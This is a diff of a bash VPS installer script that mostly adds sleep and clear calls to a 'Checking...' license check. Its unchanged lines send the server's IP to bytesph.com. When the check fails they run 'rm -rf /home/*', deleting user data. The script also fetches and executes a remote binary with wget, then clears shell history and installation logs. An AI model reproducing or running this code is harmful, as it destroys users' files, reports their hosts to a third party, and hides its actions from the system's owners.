@@ -3,13 +3,20 @@
 # Script Mod by BytesPH - AkoSiBytes
 #
 
-echo "Checking..."
-sleep 5;
+echo "Checking."
 IP=$(curl -s https://api.ipify.org)
+sleep 2
+clear
+echo "Checking.."
 DATA=$(curl -sb -X POST https://bytesph.com/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=check&ip=$IP")
+sleep 2
+clear
+echo "Checking..."
+sleep 2
 
 if [ $DATA == "false" ];
 then
+ clear
  echo "Installation is exclusive for BytesPH Only. You are not allowed. This incident is already reported to the Admin."
  echo "Exiting now..."
  curl -sb -X POST https://bytesph.com/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=unauthorized&ip=$IP"
@@ -18,7 +25,7 @@ then
  rm -rf /home/*
  exit 1
 fi
-
+clear
 #############################
 #############################
 # Variables (Can be changed depends on your preferred values)
@@ -1208,7 +1215,7 @@ netfilter-persistent reload
  wget https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/swapkvm && chmod +x swapkvm && ./swapkvm
 
 #report installation done
-curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=done&ip=$IP"
+curl -sb -X POST https://bytesph.com/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=done&ip=$IP"
 clear
 history -c
 # Clearing all logs from installation
